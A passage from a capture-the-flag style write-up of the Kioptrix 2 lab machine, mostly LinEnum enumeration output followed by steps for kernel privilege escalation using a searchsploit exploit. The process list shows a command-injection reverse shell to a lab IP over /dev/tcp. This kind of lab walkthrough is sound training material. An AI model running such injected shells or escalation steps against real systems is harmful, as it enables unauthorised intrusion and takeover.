mysql     3188  0.0 14.8 125796 18756 ?      Sl   00:42   0:00 /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --socket=/var/lib/mysql/mysql.sock
root      3214  0.0  0.3  2404  388 tty1     Ss+  00:42   0:00 /sbin/mingetty tty1
root      3215  0.0  0.3  2292  388 tty2     Ss+  00:42   0:00 /sbin/mingetty tty2
root      3216  0.0  0.3  2004  388 tty3     Ss+  00:42   0:00 /sbin/mingetty tty3
root      3217  0.0  0.3  2316  388 tty4     Ss+  00:42   0:00 /sbin/mingetty tty4
root      3218  0.0  0.3  2548  384 tty5     Ss+  00:42   0:00 /sbin/mingetty tty5
root      3219  0.0  0.3  3372  388 tty6     Ss+  00:42   0:00 /sbin/mingetty tty6
root      4335  0.0  1.7  9120 2260 ?        SNs  01:47   0:00 cupsd
apache    4377  0.0  5.6 22328 7168 ?        S    01:47   0:00 httpd
apache    4378  0.0  5.7 22392 7200 ?        S    01:47   0:00 httpd
apache    4379  0.0  5.6 22328 7140 ?        S    01:47   0:00 httpd
apache    4380  0.0  5.6 22312 7144 ?        S    01:47   0:00 httpd
apache    4381  0.0  5.7 22408 7180 ?        S    01:47   0:00 httpd
apache    4382  0.0  5.6 22312 7152 ?        S    01:47   0:00 httpd
apache    4383  0.0  5.6 22316 7132 ?        S    01:47   0:00 httpd
apache    4384  0.0  5.6 22420 7156 ?        S    01:47   0:00 httpd
apache    9877  0.0  0.8  4968 1124 ?        S    03:16   0:00 sh -c ping -c 3 127.0.0.1; bash -i >& /dev/tcp/192.168.109.131/7702 0>&1
apache    9879  0.0  1.0  5828 1288 ?        S    03:16   0:00 bash -i
apache   10252  0.0  1.1  4968 1416 ?        S    03:32   0:00 /bin/bash ./LinEnum.sh
apache   10253  0.0  0.6  4996  860 ?        R    03:32   0:00 /bin/bash ./LinEnum.sh
apache   10255  0.0  0.3  4448  452 ?        S    03:32   0:00 tee -a
apache   10452  0.0  0.6  4996  804 ?        S    03:32   0:00 /bin/bash ./LinEnum.sh
apache   10453  0.0  0.6  2488  792 ?        R    03:32   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
-rwxr-xr-x  1 root root  616248 Aug 13  2006 /bin/bash
lrwxrwxrwx  1 root root       4 Oct  7  2009 /bin/sh -> bash
-rwxr-xr-x  1 root root   12772 Feb 21  2005 /sbin/mingetty
-rwxr-xr-x  1 root root 6036288 Jul 25  2008 /usr/libexec/mysqld
-rwxr-x---  1 root root   22540 Feb 21  2005 /usr/sbin/acpid
-rwxr-xr-x  1 root root   19544 Apr 26  2006 /usr/sbin/atd
-rwxr-xr-x  1 root root  313008 May  2  2007 /usr/sbin/sshd


[-] Contents of /etc/xinetd.conf:
#
# Simple configuration file for xinetd
#
# Some defaults, and include /etc/xinetd.d/

defaults
{
        instances               = 60
        log_type                = SYSLOG authpriv
        log_on_success          = HOST PID
        log_on_failure          = HOST
        cps                     = 25 30
}

includedir /etc/xinetd.d


[-] /etc/xinetd.d is included in /etc/xinetd.conf - associated binary permissions are listed below:
total 144
drwxr-xr-x   2 root root  4096 Oct  7  2009 .
drwxr-xr-x  80 root root 12288 May 25 01:47 ..
-rw-r--r--   1 root root   563 Aug 21  2005 chargen
-rw-r--r--   1 root root   580 Aug 21  2005 chargen-udp
-rwxr-xr-x   1 root root   239 May  3  2007 cups-lpd
-rw-r--r--   1 root root   419 Aug 21  2005 daytime
-rw-r--r--   1 root root   438 Aug 21  2005 daytime-udp
-rw-r--r--   1 root root   341 Aug 21  2005 echo
-rw-r--r--   1 root root   360 Aug 21  2005 echo-udp
-rw-r--r--   1 root root   323 May  3  2007 eklogin
-rw-r--r--   1 root root   326 May  3  2007 gssftp
-rw-r--r--   1 root root   310 May  3  2007 klogin
-rw-r--r--   1 root root   323 May  3  2007 krb5-telnet
-rw-r--r--   1 root root   308 May  3  2007 kshell
-rw-r--r--   1 root root   317 Feb 21  2005 rsync
-rw-r--r--   1 root root   497 Aug 21  2005 time
-rw-r--r--   1 root root   518 Aug 21  2005 time-udp


[-] /etc/init.d/ binary permissions:
lrwxrwxrwx  1 root root 11 Oct  7  2009 /etc/init.d -> rc.d/init.d


[-] /etc/rc.d/init.d binary permissions:
total 712
drwxr-xr-x   2 root root     4096 Oct  8  2009 .
drwxr-xr-x  10 root root     4096 Oct  7  2009 ..
-rwxr-xr-x   1 root root     1128 Feb 21  2005 acpid
-rwxr-xr-x   1 root root      834 Feb 21  2005 anacron
-rwxr-xr-x   1 root root     1429 Feb 21  2005 apmd
-rwxr-xr-x   1 root root     4404 Feb 21  2005 arptables_jf
-rwxr-xr-x   1 root root     1176 Apr 26  2006 atd
-rwxr-xr-x   1 root root     2781 May  2  2007 auditd
-rwxr-xr-x   1 root root    16544 May  3  2007 autofs
-rwxr-xr-x   1 root root     1368 Feb 21  2005 bluetooth
-rwxr-xr-x   1 root root     1355 May  2  2007 cpuspeed
-rwxr-xr-x   1 root root     1904 Jul 12  2006 crond
-rwxr-xr-x   1 root root     2312 May  3  2007 cups
-rwxr-xr-x   1 root root     1502 Feb 21  2005 dc_client
-rwxr-xr-x   1 root root     1344 Feb 21  2005 dc_server
-rwxr-xr-x   1 root root    16898 May  2  2007 diskdump
-rwxr-xr-x   1 root root      968 Feb 21  2005 dund
-rwxr-xr-x   1 root root    10799 Nov 20  2006 functions
-rwxr-xr-x   1 root root     1778 May 17  2006 gpm
-rwxr-xr-x   1 root root     1388 May  2  2007 haldaemon
-rwxr-xr-x   1 root root     6028 Jan 15  2007 halt
-rwxr-xr-x   1 root root     1001 Feb 21  2005 hidd
-rwxr-xr-x   1 root root     3201 May  4  2007 httpd
-rwxr-xr-x   1 root root    13763 May  3  2007 ipmi
-rwxr-xr-x   1 root root     7135 Feb 21  2005 iptables
-rwxr-xr-x   1 root root     1487 Feb 21  2005 irda
-rwxr-xr-x   1 root root     1949 May  2  2007 irqbalance
-rwxr-xr-x   1 root root     6183 Feb 21  2005 isdn
-rwxr-xr-x   1 root root      200 Sep 27  2006 keytable
-rwxr-xr-x   1 root root      652 Sep  3  2003 killall
-rwxr-xr-x   1 root root     2095 May  2  2007 kudzu
-rwxr-xr-x   1 root root     1906 May  5  2007 lvm2-monitor
-rwxr-xr-x   1 root root     1700 May  3  2007 mdmonitor
-rwxr-xr-x   1 root root     1613 May  3  2007 mdmpd
-rwxr-xr-x   1 root root     1746 May  3  2007 messagebus
-rwxr-xr-x   1 root root     1731 May  2  2007 microcode_ctl
-rwxr-xr-x   1 root root     4235 Jul 25  2008 mysqld
-rwxr-xr-x   1 root root    12198 May  2  2007 netdump
-rwxr-xr-x   1 root root     7422 Nov 20  2006 netfs
-rwxr-xr-x   1 root root     1303 May  2  2007 netplugd
-rwxr-xr-x   1 root root     8543 Apr 18  2006 network
-rwxr-xr-x   1 root root     1454 May  3  2007 NetworkManager
-rwxr-xr-x   1 root root     4344 May  3  2007 nfs
-rwxr-xr-x   1 root root     3274 May  3  2007 nfslock
-rwxr-xr-x   1 root root     2171 May  2  2007 nscd
-rwxr-xr-x   1 root root     3586 May  5  2007 ntpd
-rwxr-xr-x   1 root root    17713 May  3  2007 openibd
-rwxr-xr-x   1 root root     1144 Feb 21  2005 pand
-rwxr-xr-x   1 root root     4431 Mar  8  2006 pcmcia
-rwxr-xr-x   1 root root     1877 Feb 21  2005 portmap
-rwxr-xr-x   1 root root     1021 Jan 17  2007 psacct
-rwxr-xr-x   1 root root     2404 Oct 18  2004 rawdevices
-rwxr-xr-x   1 root root     1387 May  2  2007 rdisc
-rwxr-xr-x   1 root root      790 May  2  2007 readahead
-rwxr-xr-x   1 root root      795 May  2  2007 readahead_early
-rwxr-xr-x   1 root root     1777 May  3  2007 rhnsd
-rwxr-xr-x   1 root root     2177 May  3  2007 rpcgssd
-rwxr-xr-x   1 root root     1805 May  3  2007 rpcidmapd
-rwxr-xr-x   1 root root     2153 May  3  2007 rpcsvcgssd
-rwxr-xr-x   1 root root     1547 Feb 21  2005 saslauthd
-rwxr-xr-x   1 root root     3349 May  2  2007 sendmail
-rwxr-xr-x   1 root root     1175 Jul 10  2002 single
-rwxr-xr-x   1 root root     2247 May  2  2007 smartd
-rwxr-xr-x   1 root root     3282 May  4  2007 squid
-rwxr-xr-x   1 root root     3105 May  2  2007 sshd
-rwxr-xr-x   1 root root     1369 Feb 21  2005 syslog
-rwxr-x---   1 root pegasus  2321 Aug 12  2006 tog-pegasus
-rwxr-xr-x   1 root root     2796 Feb 21  2005 tux
-rwxr-xr-x   1 root root     1880 Aug 12  2006 vsftpd
-rwxr-xr-x   1 root root     1548 Feb 15  2007 winbind
-rwxr-xr-x   1 root root     1650 May  2  2007 wpa_supplicant
-rwxr-xr-x   1 root root     3607 May  3  2007 xfs
-rwxr-xr-x   1 root root     2497 Aug 21  2005 xinetd
-rwxr-xr-x   1 root root     2822 May  2  2007 ypbind
-rwxr-xr-x   1 root root     1036 May  5  2007 yum


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.6.7p5


[-] MYSQL version:
mysql  Ver 14.7 Distrib 4.1.22, for redhat-linux-gnu (i686) using readline 4.3


[-] Apache version:
Server version: Apache/2.0.52
Server built:   May  4 2007 06:25:03


### INTERESTING FILES ####################################
[-] Useful file locations:
/usr/bin/wget
/usr/bin/nmap
/usr/bin/gcc
/usr/bin/curl


[-] Can we read/write sensitive files:
-rw-r--r--  1 root root 1772 Oct 12  2009 /etc/passwd
-rw-r--r--  1 root root 638 Oct 12  2009 /etc/group
-rw-r--r--  1 root root 842 May 24  2004 /etc/profile
-r--------  1 root root 1141 Oct 12  2009 /etc/shadow


[-] SUID files:
-r-sr-xr-x  1 root root 46076 May  2  2007 /sbin/unix_chkpwd
-r-s--x--x  1 root root 20016 May  2  2007 /sbin/pam_timestamp_check
-r-sr-xr-x  1 root root 301242 May  2  2007 /sbin/pwdb_chkpwd
-rwsr-xr-x  1 root root 6096 May  2  2007 /usr/sbin/ccreds_validate
-rws--x--x  1 root root 30760 May  2  2007 /usr/sbin/userhelper
-rwsr-xr-x  1 root root 6668 Feb 21  2005 /usr/sbin/userisdnctl
-r-s--x---  1 root apache 10760 May  4  2007 /usr/sbin/suexec
-rwsr-xr-x  1 root root 15228 May  3  2007 /usr/sbin/usernetctl
-rws--x--x  1 root root 434644 May  2  2007 /usr/libexec/openssh/ssh-keysign
-rwsr-xr-x  1 root root 7396 May  2  2007 /usr/libexec/pt_chown
-rwsr-xr-x  1 root root 123961 May  3  2007 /usr/kerberos/bin/ksu
-rwsr-x---  1 root squid 9952 May  4  2007 /usr/lib/squid/pam_auth
-rwsr-x---  1 root squid 10208 May  4  2007 /usr/lib/squid/ncsa_auth
-rws--x--x  1 root root 18392 May  3  2007 /usr/bin/chsh
-rwsr-xr-x  1 root root 17304 May 10  2006 /usr/bin/rcp
---s--x--x  1 root root 93816 Aug 21  2005 /usr/bin/sudo
-rwsr-xr-x  1 root root 117802 May  2  2007 /usr/bin/chage
-rwsr-xr-x  1 root root 82772 Jul 12  2006 /usr/bin/crontab
-rwsr-xr-x  1 root root 12312 May 10  2006 /usr/bin/rlogin
-rwsr-xr-x  1 root root 8692 May 10  2006 /usr/bin/rsh
-rwsr-xr-x  1 root root 131181 May  2  2007 /usr/bin/gpasswd
-rwsr-xr-x  1 root root 42280 Apr 26  2006 /usr/bin/at
-rws--x--x  1 root root 7700 May  3  2007 /usr/bin/newgrp
-rws--x--x  1 root root 17708 May  3  2007 /usr/bin/chfn
-rwsr-xr-x  1 root root 19597 May  3  2007 /usr/bin/lppasswd
-rwsr-xr-x  1 root root 72261 May  2  2007 /usr/bin/sg
-r-s--x--x  1 root root 21200 Aug 21  2005 /usr/bin/passwd
-rwsr-xr-x  1 root root 87016 May  3  2007 /bin/mount
-rwsr-xr-x  1 root root 12300 May  2  2007 /bin/traceroute6
-rwsr-xr-x  1 root root 23844 Nov 23  2006 /bin/traceroute
-rwsr-xr-x  1 root root 53612 May  3  2007 /bin/umount
-rwsr-xr-x  1 root root 30924 May  2  2007 /bin/ping6
-rwsr-xr-x  1 root root 33272 May  2  2007 /bin/ping
-rwsr-xr-x  1 root root 61168 May  5  2007 /bin/su


[-] SGID files:
-rwxr-Sr-t  1 root root 1733 Feb  9  2012 /var/www/html/index.php
-rwxr-Sr-t  1 root root 199 Oct  8  2009 /var/www/html/pingit.php
-rwxr-sr-x  1 root root 11367 May  3  2007 /sbin/netreport
-rwxr-sr-x  1 root lock 15372 Apr  4  2006 /usr/sbin/lockdev
-rwxr-sr-x  1 root smmsp 746328 May  2  2007 /usr/sbin/sendmail.sendmail
-rwxr-sr-x  1 root utmp 10497 Feb 21  2005 /usr/sbin/utempter
-r-xr-sr-x  1 root tty 9752 May  5  2007 /usr/bin/wall
-rwxr-sr-x  1 root slocate 38548 Aug 21  2005 /usr/bin/slocate
-rwxr-sr-x  1 root mail 14636 Feb 21  2005 /usr/bin/lockfile
-rwxr-sr-x  1 root tty 10124 May  3  2007 /usr/bin/write
-rwxr-sr-x  1 root nobody 57932 May  2  2007 /usr/bin/ssh-agent


[+] Possibly interesting SGID files:
-rwxr-Sr-t  1 root root 1733 Feb  9  2012 /var/www/html/index.php
-rwxr-Sr-t  1 root root 199 Oct  8  2009 /var/www/html/pingit.php


[-] NFS config details: 
-rw-r--r--  1 root root 0 Jan 12  2000 /etc/exports


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r--  1 root root 694 Feb 21  2005 /etc/syslog.conf
-rw-r--r--  1 root root 401 May  5  2007 /etc/yum.conf
-rwxr-xr-x  1 root root 1484 Jan  1  2006 /etc/request-key.conf
-rw-r--r--  1 root root 10 Oct  7  2009 /etc/pam_smb.conf
-rw-r--r--  1 root root 1623 Oct  7  2009 /etc/nsswitch.conf
-rw-r--r--  1 root root 658 May  3  2007 /etc/initlog.conf
-rw-r--r--  1 root root 216 May  3  2007 /etc/sestatus.conf
-rw-r--r--  1 root root 28 May  2  2007 /etc/ld.so.conf
-rw-r--r--  1 root root 3243 Feb 21  2005 /etc/lftp.conf
-rw-r--r--  1 root root 10814 Feb 20  2006 /etc/ltrace.conf
-rw-r--r--  1 root root 23735 Feb 21  2005 /etc/webalizer.conf
-rw-r--r--  1 root root 604 May  3  2007 /etc/sysctl.conf
-rw-r--r--  1 root root 585 Oct  7  2009 /etc/yp.conf
-rw-r--r--  1 root root 1895 May  2  2007 /etc/nscd.conf
-rw-r--r--  1 root root 3058 Oct  7  2009 /etc/smartd.conf
-rw-r-----  1 root root 450 May  2  2007 /etc/auditd.conf
-rw-r--r--  1 root root 81 May 25 00:42 /etc/resolv.conf
-rw-r--r--  1 root root 23488 Feb 21  2005 /etc/jwhois.conf
-rw-r--r--  1 root root 134 May  2  2007 /etc/pwdb.conf
-rw-r--r--  1 root root 2281 Oct  7  2009 /etc/krb.conf
-rw-r--r--  1 root root 296 Aug 21  2005 /etc/updatedb.conf
-rw-r--r--  1 root root 833 Aug 13  2006 /etc/gssapi_mech.conf
-rw-r--r--  1 root root 505 Oct 20  2006 /etc/logrotate.conf
-rw-r--r--  1 root root 17 Jul 23  2000 /etc/host.conf
-rw-r--r--  1 root root 2657 May  2  2007 /etc/warnquota.conf
-rw-r--r--  1 root root 615 Oct  7  2009 /etc/krb5.conf
-rw-r--r--  1 root root 759 Jun  1  2009 /etc/pear.conf
-rw-r--r--  1 root root 153 Feb 21  2005 /etc/esd.conf
-rw-r--r--  1 root root 1983 Feb 21  2005 /etc/mtools.conf
-rw-r--r--  1 root root 463 May  2  2007 /etc/cpuspeed.conf
-rw-r--r--  1 root root 2374 Oct  7  2009 /etc/libuser.conf
-rw-r--r--  1 root root 2434 May  5  2007 /etc/ntp.conf
-rw-r--r--  1 root root 821 Oct  1  2004 /etc/prelink.conf
-rw-r--r--  1 root root 1756 May 17  2006 /etc/gpm-root.conf
-rw-r--r--  1 root root 177 May  3  2007 /etc/idmapd.conf
-rw-r--r--  1 root root 0 Feb 21  2005 /etc/wvdial.conf
-rw-r--r--  1 root root 8738 Oct  7  2009 /etc/ldap.conf
-rw-r--r--  1 root root 51 Oct 12  2009 /etc/modprobe.conf
-rw-r--r--  1 root root 289 Aug 21  2005 /etc/xinetd.conf


[-] Location and Permissions (if accessible) of .bak file(s):
-r--r--r--  1 root root 1243 Aug 16  2003 /usr/lib/perl5/vendor_perl/5.8.5/i386-linux-thread-multi/Filter/exec.pm.bak
-r--r--r--  1 root root 1471 Aug 16  2003 /usr/lib/perl5/vendor_perl/5.8.5/i386-linux-thread-multi/Filter/sh.pm.bak
-r--r--r--  1 root root 2181 Aug 16  2003 /usr/lib/perl5/vendor_perl/5.8.5/i386-linux-thread-multi/Filter/cpp.pm.bak
-rw-r--r--  1 root root 47 Oct 10  2009 /etc/issue.bak


[-] Any interesting mail in /var/mail:
lrwxrwxrwx  1 root root 10 Oct  7  2009 /var/mail -> spool/mail


### SCAN COMPLETE ####################################
```

The only thing of interest appears to be the kernel version. Using 'searchsploit', we can check if there is a privilege escalation exploit available for it.

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic24.png)

From the results above, it's evident that the kernel version is vulnerable to privilege escalation.

---

## 💥Post-Exploitation

Now it's time to elevate our privileges. First, we need to bring the exploitation code to the current working directory. Use this command:

```shell
searchsploit -m linux_x86/local/9542.c
```

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic25.png)

The author tested it on the same operating system version:

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic26.png)

As before, we need to transfer the exploitation file to the target machine. After transferring it, compile the code, and finally, execute it.

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic27.png)

And we have root access 🥳. That’s it for this write-up. I hope it was useful to you. Thanks for your time and see you in another article.

kfrafrvmrebfrira 😉